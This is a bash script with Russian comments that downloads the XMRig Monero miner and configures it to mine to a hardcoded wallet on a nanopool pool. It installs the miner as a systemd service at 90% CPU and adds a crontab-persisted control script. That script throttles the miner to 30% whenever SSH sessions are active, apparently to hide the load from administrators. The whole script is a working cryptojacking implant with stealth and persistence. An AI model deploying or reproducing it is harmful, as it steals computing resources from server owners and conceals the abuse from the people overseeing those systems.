#!/bin/bash

# Задаем переменные
XMRIG_VERSION="6.15.0"
XMRIG_DIR="/usr/local/xmrig"
XMRIG_BIN="$XMRIG_DIR/xmrig"
POOL="xmr-eu1.nanopool.org:14444"
WALLET="4A9SeKhwWx8DtAboVp1e1LdbgrRJxvjEFNh4VNw1NDng6ELLeKJPVrPQ9n9eNc4iLVC4BKeR4egnUL68D1qUmdJ7N3TaB5w"
CONTROL_SCRIPT="/usr/local/bin/xmrig_control.sh"
CONFIG_FILE="/etc/xmrig/config.json"
WORKERS_COUNT=10000

# Установка необходимых пакетов
echo "Устанавливаем необходимые пакеты..."
apt-get update
apt-get install -y wget curl jq

# Создание директории для XMRig
echo "Создаем директорию для XMRig..."
sudo mkdir -p $XMRIG_DIR

# Загрузка и распаковка XMRig
echo "Загружаем и распаковываем XMRig..."
wget https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VERSION/xmrig-$XMRIG_VERSION-linux-x64.tar.gz -O /tmp/xmrig.tar.gz
tar -xzf /tmp/xmrig.tar.gz -C /tmp
sudo mv /tmp/xmrig-$XMRIG_VERSION/xmrig $XMRIG_BIN
sudo chmod +x $XMRIG_BIN

# Генерация конфигурационного файла для XMRig
echo "Создание конфигурационного файла для XMRig..."
sudo mkdir -p /etc/xmrig
cat <<EOF | sudo tee $CONFIG_FILE
{
  "autosave": true,
  "cpu": true,
  "pools": [
    {
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "x",
      "coin": "monero"
    }
  ],
  "api": {
    "enabled": false,
    "port": 0
  },
  "workers": [
EOF

for (( i=1; i<=WORKERS_COUNT; i++ )); do
    echo "    {\"name\": \"worker${i}\"},"
done | sudo tee -a $CONFIG_FILE

# Завершение конфигурационного файла
echo '  ]
}' | sudo tee -a $CONFIG_FILE

# Создание системного сервиса для XMRig
echo "Создание системного сервиса для XMRig..."
echo "[Unit]
Description=XMRig Miner
After=network.target

[Service]
ExecStart=$XMRIG_BIN --config $CONFIG_FILE
Nice=10
CPUQuota=90%

[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/xmrig.service

# Перезагрузка системного менеджера для распознавания нового сервиса
echo "Перезагрузка системного менеджера..."
sudo systemctl daemon-reload

# Включение и запуск XMRig
echo "Включение и запуск XMRig..."
sudo systemctl enable xmrig
sudo systemctl start xmrig

# Создание скрипта для управления нагрузкой XMRig в зависимости от SSH-подключений
echo "Создание скрипта управления XMRig..."
echo "#!/bin/bash

# Функция для обновления CPUQuota в зависимости от количества SSH-подключений
update_cpu_quota() {
    ssh_connections=\$(who | grep -c \"ssh\")
    if [ \$ssh_connections -gt 0 ]; then
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=30%
    else
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=90%
    fi
}

# Бесконечный цикл для проверки каждые 60 секунд
while true; do
    update_cpu_quota
    sleep 60
done" | sudo tee $CONTROL_SCRIPT

# Делаем скрипт исполняемым
echo "Делаем скрипт управления XMRig исполняемым..."
sudo chmod +x $CONTROL_SCRIPT

# Добавление скрипта в автозагрузку через crontab
echo "Добавление скрипта в автозагрузку..."
(crontab -l 2>/dev/null; echo "@reboot $CONTROL_SCRIPT") | crontab -

# Запуск скрипта управления XMRig
echo "Запуск скрипта управления XMRig..."
$CONTROL_SCRIPT &

echo "Скрипт выполнен успешно."
